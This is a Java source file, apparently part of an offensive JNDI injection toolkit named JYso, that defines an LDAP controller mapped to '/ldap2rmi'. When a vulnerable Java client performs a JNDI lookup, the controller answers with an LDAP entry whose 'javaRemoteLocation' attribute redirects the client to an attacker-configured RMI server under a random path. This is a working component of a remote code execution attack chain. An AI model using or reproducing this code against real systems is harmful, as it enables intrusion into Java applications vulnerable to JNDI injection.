package com.qi4l.JYso.controllers;

import com.qi4l.JYso.exceptions.IncorrectParamsException;
import com.qi4l.JYso.exceptions.UnSupportedActionTypeException;
import com.qi4l.JYso.exceptions.UnSupportedGadgetTypeException;
import com.qi4l.JYso.exceptions.UnSupportedPayloadTypeException;
import com.qi4l.JYso.gadgets.Config.Config;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.fusesource.jansi.Ansi;

import java.util.Random;

@LdapMapping(uri = {"/ldap2rmi"})
public class ldap2rmiController implements LdapController {

    private final  String     ip      = Config.ip;
    private final  String     rmiPort = String.valueOf(Config.rmiPort);

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        System.out.println("- Change LDAP to RMI ");

        Random        random = new Random();
        StringBuilder sb     = new StringBuilder(5);

        for (int i = 0; i < 5; i++) {
            char letter = (char) (random.nextInt(26) + 'a');
            sb.append(letter);
        }

        String randomLetters = sb.toString();

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "foo");
        e.addAttribute("javaRemoteLocation", "rmi://" + ip + ":" + rmiPort + "/" + randomLetters);

        System.out.println(Ansi.ansi().fgBrightMagenta().a("  redirecting to: " + "rmi://" + ip + ":" + rmiPort + "/" + randomLetters).reset());

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException, UnSupportedGadgetTypeException, UnSupportedActionTypeException {

    }
}